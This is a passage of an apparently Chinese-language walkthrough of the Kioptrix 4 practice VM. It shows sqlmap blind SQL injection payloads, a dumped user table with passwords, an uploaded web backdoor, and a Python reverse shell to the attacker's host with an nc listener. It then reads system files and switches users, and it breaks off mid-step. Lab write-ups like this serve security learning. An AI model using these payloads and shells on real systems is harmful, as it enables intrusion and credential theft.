class="hljs-string">[10:28:51] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="hljs-string">&#x27; </span><br><span class="hljs-string">[10:28:51] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: mypassword (POST)</span><br><span class="hljs-string">    Type: boolean-based blind</span><br><span class="hljs-string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="hljs-string">    Payload: myusername=john&amp;mypassword=-2527&#x27;</span> OR 7958=7958<span class="hljs-comment">#&amp;Submit=Login</span><br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: myusername=john&amp;mypassword=1234<span class="hljs-string">&#x27; AND (SELECT 6799 FROM (SELECT(SLEEP(5)))huMm)-- NgWU&amp;Submit=Login</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[10:28:51] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="hljs-string">web application technology: Apache 2.2.8, PHP 5.2.4</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="hljs-string">[10:28:51] [INFO] fetching tables for database: &#x27;</span>members<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[10:28:51] [INFO] fetching number of tables for database &#x27;</span>members<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[10:28:51] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="hljs-string">&#x27; for faster data retrieval</span><br><span class="hljs-string">[10:28:51] [INFO] retrieved: </span><br><span class="hljs-string">got a 302 redirect to &#x27;</span>http://192.1.1.135/login_success.php?username=john<span class="hljs-string">&#x27;. Do you want to follow? [Y/n] y</span><br><span class="hljs-string">redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y</span><br><span class="hljs-string">1</span><br><span class="hljs-string">[10:28:57] [INFO] retrieved: members</span><br><span class="hljs-string">Database: members</span><br><span class="hljs-string">[1 table]</span><br><span class="hljs-string">+---------+</span><br><span class="hljs-string">| members |</span><br><span class="hljs-string">+---------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:28:57] [INFO] fetched data logged to text files under &#x27;</span>/home/kali/.local/share/sqlmap/output/192.1.1.135<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] ending @ 10:28:57 /2023-07-15/</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sqlmap -r login  -D members -T members --dump<br>        ___<br>       __H__                                                                                                        <br> ___ ___[ ]_____ ___ ___  &#123;1.7.6<span class="hljs-comment">#stable&#125;                                                                            </span><br>|_ -| . [)]     | .<span class="hljs-string">&#x27;| . |                                                                                           </span><br><span class="hljs-string">|___|_  [&#x27;</span>]_|_|_|__,|  _|                                                                                           <br>      |_|V...       |_|   https://sqlmap.org                                                                        <br><br>[!] legal disclaimer: Usage of sqlmap <span class="hljs-keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user\<span class="hljs-string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 10:29:16 /2023-07-15/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:29:16] [INFO] parsing HTTP request from &#x27;</span>login<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[10:29:16] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="hljs-string">&#x27; </span><br><span class="hljs-string">[10:29:16] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: mypassword (POST)</span><br><span class="hljs-string">    Type: boolean-based blind</span><br><span class="hljs-string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="hljs-string">    Payload: myusername=john&amp;mypassword=-2527&#x27;</span> OR 7958=7958<span class="hljs-comment">#&amp;Submit=Login</span><br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: myusername=john&amp;mypassword=1234<span class="hljs-string">&#x27; AND (SELECT 6799 FROM (SELECT(SLEEP(5)))huMm)-- NgWU&amp;Submit=Login</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[10:29:16] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span><br><span class="hljs-string">web application technology: Apache 2.2.8, PHP 5.2.4</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="hljs-string">[10:29:16] [INFO] fetching columns for table &#x27;</span>members<span class="hljs-string">&#x27; in database &#x27;</span>members<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[10:29:16] [WARNING] running in a single-thread mode. Please consider usage of option &#x27;</span>--threads<span class="hljs-string">&#x27; for faster data retrieval</span><br><span class="hljs-string">[10:29:16] [INFO] retrieved: </span><br><span class="hljs-string">got a 302 redirect to &#x27;</span>http://192.1.1.135/login_success.php?username=john<span class="hljs-string">&#x27;. Do you want to follow? [Y/n] y</span><br><span class="hljs-string">redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y</span><br><span class="hljs-string">3</span><br><span class="hljs-string">[10:29:18] [INFO] retrieved: id</span><br><span class="hljs-string">[10:29:18] [INFO] retrieved: username</span><br><span class="hljs-string">[10:29:19] [INFO] retrieved: password</span><br><span class="hljs-string">[10:29:19] [INFO] fetching entries for table &#x27;</span>members<span class="hljs-string">&#x27; in database &#x27;</span>members<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[10:29:19] [INFO] fetching number of entries for table &#x27;</span>members<span class="hljs-string">&#x27; in database &#x27;</span>members<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[10:29:19] [INFO] retrieved: 2</span><br><span class="hljs-string">[10:29:19] [INFO] retrieved: MyNameIsJohn</span><br><span class="hljs-string">[10:29:20] [INFO] retrieved: 1</span><br><span class="hljs-string">[10:29:20] [INFO] retrieved: john</span><br><span class="hljs-string">[10:29:20] [INFO] retrieved: ADGAdsafdfwt4gadfga==</span><br><span class="hljs-string">[10:29:21] [INFO] retrieved: 2</span><br><span class="hljs-string">[10:29:21] [INFO] retrieved: robert</span><br><span class="hljs-string">Database: members</span><br><span class="hljs-string">Table: members</span><br><span class="hljs-string">[2 entries]</span><br><span class="hljs-string">+----+----------+-----------------------+</span><br><span class="hljs-string">| id | username | password              |</span><br><span class="hljs-string">+----+----------+-----------------------+</span><br><span class="hljs-string">| 1  | john     | MyNameIsJohn          |</span><br><span class="hljs-string">| 2  | robert   | ADGAdsafdfwt4gadfga== |</span><br><span class="hljs-string">+----+----------+-----------------------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:29:21] [INFO] table &#x27;</span>members.members<span class="hljs-string">&#x27; dumped to CSV file &#x27;</span>/home/kali/.local/share/sqlmap/output/192.1.1.135/dump/members/members.csv<span class="hljs-string">&#x27;                                                                                               </span><br><span class="hljs-string">[10:29:21] [INFO] fetched data logged to text files under &#x27;</span>/home/kali/.local/share/sqlmap/output/192.1.1.135<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] ending @ 10:29:21 /2023-07-15/</span><br></code></pre></td></tr></table></figure><p>得到了用户名和密码，先尝试登录刚才页面里的登录框，但是登陆后只能说啥都没有</p><p><img src="/pic/16d25f97fad13fdbc046d79e115a1830_MD5.png"></p><p>尝试一下 os-shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sqlmap -r login  --os-shell <br>        ___<br>       __H__                                                                                                        <br> ___ ___[.]_____ ___ ___  &#123;1.7.6<span class="hljs-comment">#stable&#125;                                                                            </span><br>|_ -| . [(]     | .<span class="hljs-string">&#x27;| . |                                                                                           </span><br><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|                                                                                           </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                                        </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 10:30:50 /2023-07-15/<br><br>[10:30:50] [INFO] parsing HTTP request from <span class="hljs-string">&#x27;login&#x27;</span><br>[10:30:50] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span> <br>[10:30:50] [INFO] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: mypassword (POST)<br>    Type: boolean-based blind<br>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)<br>    Payload: myusername=john&amp;mypassword=-2527<span class="hljs-string">&#x27; OR 7958=7958#&amp;Submit=Login</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="hljs-string">    Payload: myusername=john&amp;mypassword=1234&#x27;</span> AND (SELECT 6799 FROM (SELECT(SLEEP(5)))huMm)-- NgWU&amp;Submit=Login<br>---<br>[10:30:50] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 8.04 (Hardy Heron)<br>web application technology: PHP 5.2.4, Apache 2.2.8<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[10:30:50] [INFO] going to use a web backdoor <span class="hljs-keyword">for</span> <span class="hljs-built_in">command</span> prompt<br>[10:30:50] [INFO] fingerprinting the back-end DBMS operating system<br>[10:30:50] [INFO] the back-end DBMS operating system is Linux<br><span class="hljs-built_in">which</span> web application language does the web server support?<br>[1] ASP<br>[2] ASPX<br>[3] JSP<br>[4] PHP (default)<br><br>[10:31:01] [INFO] retrieved the web server document root: <span class="hljs-string">&#x27;/var/www&#x27;</span><br>[10:31:01] [INFO] retrieved web server absolute paths: <span class="hljs-string">&#x27;/var/www/checklogin.php&#x27;</span><br>[10:31:01] [INFO] trying to upload the file stager on <span class="hljs-string">&#x27;/var/www/&#x27;</span> via LIMIT <span class="hljs-string">&#x27;LINES TERMINATED BY&#x27;</span> method<br>[10:31:01] [INFO] the file stager has been successfully uploaded on <span class="hljs-string">&#x27;/var/www/&#x27;</span> - http://192.1.1.135:80/tmpupkhq.php<br>[10:31:01] [WARNING] unable to upload the file through the web file stager to <span class="hljs-string">&#x27;/var/www/&#x27;</span><br>[10:31:01] [WARNING] backdoor has not been successfully uploaded through the file stager possibly because the user running the web server process has not write privileges over the folder <span class="hljs-built_in">where</span> the user running the DBMS process was able to upload the file stager or because the DBMS and web server sit on different servers<br><span class="hljs-keyword">do</span> you want to try the same method used <span class="hljs-keyword">for</span> the file stager? [Y/n] y<br>[10:31:04] [INFO] the backdoor has been successfully uploaded on <span class="hljs-string">&#x27;/var/www/&#x27;</span> - http://192.1.1.135:80/tmpbhprh.php<br>[10:31:04] [INFO] calling OS shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;x&#x27;</span> or <span class="hljs-string">&#x27;q&#x27;</span> and press ENTER<br>os-shell&gt; <span class="hljs-built_in">whoami</span><br><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] y<br><span class="hljs-built_in">command</span> standard output: <span class="hljs-string">&#x27;www-data&#x27;</span><br>os-shell&gt; <span class="hljs-built_in">id</span><br><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] y<br><span class="hljs-built_in">command</span> standard output: <span class="hljs-string">&#x27;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#x27;</span><br></code></pre></td></tr></table></figure><p>成功</p><h2 id="不使用-SQLMap-的方法"><a href="#不使用-SQLMap-的方法" class="headerlink" title="不使用 SQLMap 的方法"></a>不使用 SQLMap 的方法</h2><p>这个方法是在 YouTube 上看到的 <a href="https://www.youtube.com/watch?v=c2OFrDVb3EM">Kioptrix-4 Walkthrough with S1REN! - YouTube</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wfuzz -c -z file./usr/shar/seclists/Fuzzing/SQLi/qucik-SQLi.txt -d <span class="hljs-string">&quot;myusername=john&amp;mypassword=FUZZ&amp;Submit=Login&quot;</span> --hc 404 http://192.1.1.135/checklogin.php<br></code></pre></td></tr></table></figure><p>根据返回的字符，选择 payload 尝试在浏览器里看结果，最后再次确定过滤条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wfuzz -c -z file./usr/shar/seclists/Fuzzing/SQLi/qucik-SQLi.txt -d <span class="hljs-string">&quot;myusername=john&amp;mypassword=FUZZ&amp;Submit=Login&quot;</span> --hc 404 --hh 109,264 http://192.1.1.135/checklogin.php<br></code></pre></td></tr></table></figure><p>得到：</p><p><img src="/pic/0b66f1c0b8e8751899eb6f143f2c3820_MD5.png"></p><p>登录之后可以在页面中直接得到密码，然后可以尝试 ssh 登录了。</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>不过这个 shell 不是很习惯，考虑反弹个 shell 吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">os-shell&gt; <span class="hljs-built_in">which</span> python<br><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] <br><span class="hljs-built_in">command</span> standard output: <span class="hljs-string">&#x27;/usr/bin/python&#x27;</span><br>os-shell&gt; python --version<br><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] <br><span class="hljs-built_in">command</span> standard output: <span class="hljs-string">&#x27;Python 2.5.2&#x27;</span><br>os-shell&gt; python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.1.1.128&quot;,444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] <br>No output<br></code></pre></td></tr></table></figure><p>发现有 python 环境，那就使用 python 来反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ sudo nc -lvnp 444                  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 444 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.135] 42255<br>$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@Kioptrix4:/var/www$ <span class="hljs-built_in">export</span> TERM=xterm-color<br><span class="hljs-built_in">export</span> TERM=xterm-color<br>www-data@Kioptrix4:/var/www$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 52K<br>147833 drwxr-xr-x  5 root root 4.0K Jul 15 18:31 .<br>138721 drwxr-xr-x 14 root root 4.0K Feb  4  2012 ..<br>148551 -rw-r--r--  1 root root 1.5K Feb  6  2012 checklogin.php<br>148370 -rw-r--r--  1 root root  298 Feb  4  2012 database.sql<br>155045 drwxr-xr-x  2 root root 4.0K Feb  6  2012 images<br>148550 -rw-r--r--  1 root root 1.3K Feb  6  2012 index.php<br>155041 drwxr-xr-x  2 root root 4.0K Feb  4  2012 john<br>148552 -rw-r--r--  1 root root  176 Feb  4  2012 login_success.php<br>148553 -rw-r--r--  1 root root   78 Feb  4  2012 logout.php<br>148555 -rw-r--r--  1 root root  606 Feb  6  2012 member.php<br>155042 drwxr-xr-x  2 root root 4.0K Feb  4  2012 robert<br>148677 -rw-rw-rw-  1 root root  885 Jul 15 18:31 tmpbhprh.php<br>148676 -rw-rw-rw-  1 root root  719 Jul 15 18:31 tmpupkhq.php<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>成功反弹 shell，简单看了下当前目录，尝试对各个目录和文件进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kioptrix4:/var/www$ <span class="hljs-built_in">cat</span> checklogin.php<br><span class="hljs-built_in">cat</span> checklogin.php<br>&lt;?php<br>ob_start();<br><span class="hljs-variable">$host</span>=<span class="hljs-string">&quot;localhost&quot;</span>; // Host name<br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>; // Mysql username<br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;&quot;</span>; // Mysql password<br><span class="hljs-variable">$db_name</span>=<span class="hljs-string">&quot;members&quot;</span>; // Database name<br><span class="hljs-variable">$tbl_name</span>=<span class="hljs-string">&quot;members&quot;</span>; // Table name<br><br>// Connect to server and <span class="hljs-keyword">select</span> databse.<br>mysql_connect(<span class="hljs-string">&quot;<span class="hljs-variable">$host</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-variable">$username</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-variable">$password</span>&quot;</span>)or die(<span class="hljs-string">&quot;cannot connect&quot;</span>);<br>mysql_select_db(<span class="hljs-string">&quot;<span class="hljs-variable">$db_name</span>&quot;</span>)or die(<span class="hljs-string">&quot;cannot select DB&quot;</span>);<br><br>// Define <span class="hljs-variable">$myusername</span> and <span class="hljs-variable">$mypassword</span><br><span class="hljs-variable">$myusername</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;myusername&#x27;</span>];<br><span class="hljs-variable">$mypassword</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mypassword&#x27;</span>];<br><br>// To protect MySQL injection (more detail about MySQL injection)<br><span class="hljs-variable">$myusername</span> = stripslashes(<span class="hljs-variable">$myusername</span>);<br>//<span class="hljs-variable">$mypassword</span> = stripslashes(<span class="hljs-variable">$mypassword</span>);<br><span class="hljs-variable">$myusername</span> = mysql_real_escape_string(<span class="hljs-variable">$myusername</span>);<br>//<span class="hljs-variable">$mypassword</span> = mysql_real_escape_string(<span class="hljs-variable">$mypassword</span>);<br><br>//<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM <span class="hljs-variable">$tbl_name</span> WHERE username=&#x27;<span class="hljs-variable">$myusername</span>&#x27; and password=&#x27;<span class="hljs-variable">$mypassword</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-string">&quot;SELECT * FROM <span class="hljs-variable">$tbl_name</span> WHERE username=&#x27;<span class="hljs-variable">$myusername</span>&#x27; and password=&#x27;<span class="hljs-variable">$mypassword</span>&#x27;&quot;</span>);<br>//<span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-variable">$sql</span>);<br><br>// Mysql_num_row is counting table row<br><span class="hljs-variable">$count</span>=mysql_num_rows(<span class="hljs-variable">$result</span>);<br>// If result matched <span class="hljs-variable">$myusername</span> and <span class="hljs-variable">$mypassword</span>, table row must be 1 row<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>!=0)&#123;<br>// Register <span class="hljs-variable">$myusername</span>, <span class="hljs-variable">$mypassword</span> and redirect to file <span class="hljs-string">&quot;login_success.php&quot;</span><br>        session_register(<span class="hljs-string">&quot;myusername&quot;</span>);<br>        session_register(<span class="hljs-string">&quot;mypassword&quot;</span>);<br>        header(<span class="hljs-string">&quot;location:login_success.php?username=<span class="hljs-variable">$myusername</span>&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Wrong Username or Password&quot;</span>;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&lt;form method=&quot;link&quot; action=&quot;index.php&quot;&gt;&lt;input type=submit value=&quot;Try Again&quot;&gt;&lt;/form&gt;&#x27;</span>);<br>&#125;<br><br>ob_end_flush();<br>?&gt;<br><br></code></pre></td></tr></table></figure><p>拿到了数据库的密码（没有密码），结合刚才 SQL 注入拿到的密码，可以尝试 ssh 登录或者 su 切换用户，看一眼&#x2F;etc&#x2F;passwd 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kioptrix4:/home$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/bin/sh<br>man:x:6:12:man:/var/cache/man:/bin/sh<br>lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>mail:x:8:8:mail:/var/mail:/bin/sh<br>news:x:9:9:news:/var/spool/news:/bin/sh<br>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:13:13:proxy:/bin:/bin/sh<br>www-data:x:33:33:www-data:/var/www:/bin/sh<br>backup:x:34:34:backup:/var/backups:/bin/sh<br>list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>dhcp:x:101:102::/nonexistent:/bin/false<br>syslog:x:102:103::/home/syslog:/bin/false<br>klog:x:103:104::/home/klog:/bin/false<br>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false<br>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin<br>loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash<br>john:x:1001:1001:,,,:/home/john:/bin/kshell<br>robert:x:1002:1002:,,,:/home/robert:/bin/kshell<br></code></pre></td></tr></table></figure><p>有 john 和 robert 两个用户使用 <code>robert:ADGAdsafdfwt4gadfga==</code>, <code>john:MyNameIsJohn</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kioptrix4:/home$ su john<br>su john<br>Password: MyNameIsJohn<br><br>== Welcome LigGoat Employee ==<br>LigGoat Shell is <span class="hljs-keyword">in</span> place so you  don\<span class="hljs-string">&#x27;t screw up</span><br><span class="hljs-string">Type &#x27;</span>?<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-built_in">help</span><span class="hljs-string">&#x27; to get the list of allowed commands</span><br><span class="hljs-string">john:~$ su robert</span><br><span class="hljs-string">su robert</span><br><span class="hljs-string">*** unknown command: su</span><br><span class="hljs-string">john:~$ exit</span><br><span class="hljs-string">exit</span><br><span class="hljs-string">www-data@Kioptrix4:/home$ su robert</span><br><span class="hljs-string">su robert</span><br><span class="hljs-string">Password: 